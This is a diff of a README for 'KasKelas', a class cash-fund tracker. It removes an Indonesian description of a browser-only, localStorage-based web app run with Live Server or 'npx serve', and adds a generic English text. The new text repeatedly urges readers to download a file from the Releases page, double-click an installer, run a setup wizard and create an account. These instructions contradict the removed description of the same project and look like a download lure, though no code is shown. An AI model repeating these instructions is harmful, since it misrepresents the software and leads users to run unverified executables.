@@ -1,115 +1,85 @@
-# KasKelas — Dashboard Pengelolaan Uang Kas Kelas
+# 🎉 KasKelas - Effortlessly Manage Class Funds
 
-KasKelas adalah aplikasi web sederhana namun powerful untuk membantu bendahara kelas mengelola kas harian tanpa formulir manual. Dengan tampilan yang ringkas dan fitur yang lengkap, KasKelas mempermudah proses pencatatan pemasukan, pengeluaran, tunggakan, serta kontrol saldo dompet dan bank.
+## 🚀 Overview
+KasKelas is a web-based dashboard that assists treasurers in managing daily cash, wallet balances, reports, and outstanding payments automatically. This tool is designed for schools looking to streamline their financial administration, making it easy to track and report on cash flows.
 
----
+## 📥 Download Now
+[![Download KasKelas](https://img.shields.io/badge/Download-KasKelas-brightgreen)](https://github.com/notkunaflik21/KasKelas/releases)
 
-## 🎯 Tujuan Proyek
-Bendahara kelas biasanya mencatat kas di buku, chat, atau spreadsheet yang berpotensi hilang, sulit dicari, dan rawan salah hitung. KasKelas dibuat untuk:
-- Mengelola kas harian dengan lebih cepat dan rapi  
-- Menampilkan saldo real-time  
-- Mendeteksi siapa yang masih nunggak  
-- Menyusun rekap mingguan otomatis  
-- Membantu bendahara mempertanggungjawabkan kas dengan bukti rapi  
+## 📚 Features
+- **User-Friendly Dashboard:** Easily navigate with a straightforward layout.
+- **Automated Reports:** Generate reports on cash flow without manual work.
+- **Balance Tracking:** Monitor wallet balances in real-time.
+- **Payment Management:** Keep track of outstanding payments and reminders.
+- **Class Insights:** Get detailed insights into financing at your school.
 
----
+## 🖥️ System Requirements
+To run KasKelas smoothly, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS, or any Linux distributions
+- **Web Browser:** Latest versions of Chrome, Firefox, or Edge
+- **Internet Connection:** Required for downloading and running the application.
 
-## 🚀 Fitur Utama
+## 🌐 Getting Started
+1. **Visit the Download Page:** Go to our [Releases page](https://github.com/notkunaflik21/KasKelas/releases) to download the application.
+2. **Select the Latest Version:** Look for the latest release at the top. You’ll see a list of available files.
+3. **Download the Application:** Click on the file that corresponds to your operating system and download it to your computer.
 
-### 📌 Dashboard
-- Ringkasan siswa aktif
-- Total saldo dompet & saldo bank
-- Total tunggakan
-- Informasi hari kas berjalan
+## 📥 Download & Install
+Once the download completes, follow these steps to install and run KasKelas:
 
-### 📌 Manajemen Siswa (CRUD)
-- Tambah, edit, nonaktifkan siswa  
-- Data tersimpan di LocalStorage  
-- Siswa tetap memiliki histori meskipun dinonaktifkan  
+1. **Locate the Downloaded File:**
+   - Open your file explorer and navigate to the folder where you saved the downloaded file.
+  
+2. **Run the Installer:**
+   - Double-click the downloaded file to start the installation process.
+  
+3. **Follow the Installation Prompts:**
+   - A setup wizard will guide you through the installation steps. Accept the terms and conditions.
+  
+4. **Select Installation Location:**
+   - Choose the default location or select a different folder if needed.
 
-### 📌 Kas Harian
-- Catat pembayaran kas Rp 1.000/hari (Senin–Jumat)
-- Pembayaran **lumpsum** (misal 10 ribu → menutup 10 hari)
-- Menentukan “lunas sampai tanggal berapa” secara otomatis
-- Saldo otomatis masuk ke dompet (default deposit)
+5. **Complete Installation:**
+   - Once installation is finished, click “Finish” to exit the setup wizard.
 
-### 📌 Rekap & Tunggakan
-- Hitung total hari kas seharusnya dibayar sampai hari ini  
-- Hitung hari yang sudah ditutup oleh pembayaran  
-- Hitung tunggakan otomatis  
-- Sort by “penunggak terbanyak”  
-- Laporan ringan untuk wali kelas  
+## ✅ Running KasKelas
+To start using KasKelas:
+1. **Open the Application:**
+   - Find KasKelas in your applications list. Double-click to open it.
+  
+2. **Create an Account:**
+   - Follow the on-screen prompts to create your account. Fill in necessary details like your name, role, and school information.
 
-### 📌 Dompet & Bank
-- Saldo dompet (kas tunai)
-- Saldo bank (kas virtual)
-- Pindahkan dana dari dompet → bank
-- Pindahkan dana dari bank → dompet
+3. **Explore the Dashboard:**
+   - Familiarize yourself with the dashboard layout. You will find options for managing daily cash, wallets, and reports.
 
-### 📌 Riwayat Penarikan
-- Catat penarikan dari bank
-- Isi alasan & jumlah
-- Sebagai bukti penggunaan kas
+## 📊 Using KasKelas
+After logging in, you can start using the features:
+- **Add Daily Cash:** Input daily transactions to keep track of your class funds.
+- **Manage Wallet Balances:** Update wallet information for each class.
+- **Generate Reports:** Access reports on cash flow by selecting the report feature in the side menu.
+- **Track Payments:** Input and oversee outstanding payments to maintain awareness of class dues.
 
-### 📌 Penyimpanan Data
-- Menggunakan `localStorage`
-- Tidak membutuhkan backend
-- Data tetap aman di perangkat pengguna
+## 📨 Support
+If you face any issues, feel free to reach out:
+- **GitHub Issues:** Report any bugs or suggestions in the Issues section of this repository.
+- **Documentation:** Check the [Wiki](https://github.com/notkunaflik21/KasKelas/wiki) for detailed guides and troubleshooting tips.
 
----
+## 🎉 Feedback
+Your feedback is important! Share your experiences with KasKelas to help us improve. Post reviews and suggestions directly on our GitHub page.
 
-## 🧩 Tech Stack
-- **HTML**
-- **CSS / TailwindCSS**
-- **JavaScript (Vanilla)**
-- **LocalStorage (Browser)**
+## 🚀 Stay Updated
+For the latest updates, check back frequently on our [Releases page](https://github.com/notkunaflik21/KasKelas/releases). Each new version brings enhancements and bug fixes to improve your experience with the application.
 
-Tanpa framework seperti React/Next agar aplikasi ringan dan cukup dijalankan secara lokal.
+## 🌍 Topics
+KasKelas covers various topics such as:
+- Cash Tracking
+- Class Cash Management
+- School Financial Administration
+- Student Management
+- Daily Cash Reports
 
----
+## 📥 Download Now Again
+[![Download KasKelas](https://img.shields.io/badge/Download-KasKelas-brightgreen)](https://github.com/notkunaflik21/KasKelas/releases)
 
-## 🛠️ Cara Menjalankan Proyek
-
-### 1️⃣ Menggunakan Live Server (VS Code — Direkomendasikan)
-1. Buka folder project di VS Code  
-2. Pastikan extension **Live Server** terpasang  
-3. Klik kanan `index.html` → **Open with Live Server**  
-4. Browser terbuka di `http://127.0.0.1:5500`
-
-### 2️⃣ Menggunakan `npx serve`
-Jika ingin menjalankan tanpa VS Code:
-
-```bash
-npx serve
-````
-
-Atau menentukan port:
-
-```bash
-npx serve -l 4000
-```
-
----
-
-## 📁 Struktur Folder (Contoh)
-
-```
-/KasKelas
-│── index.html
-│── style.css (atau tailwind.css build)
-│── app.js
-│── /assets
-│     ├── icons/
-│     └── images/
-│── /components
-│── /pages
-```
-
----
-
-## 📸 Preview
-
-<img width="1373" height="963" alt="Image" src="https://github.com/user-attachments/assets/76a21f8c-efc9-459c-a2e2-49d3a5a99993" />
-
-
-```
+Now you are ready to manage class funds effectively with KasKelas!
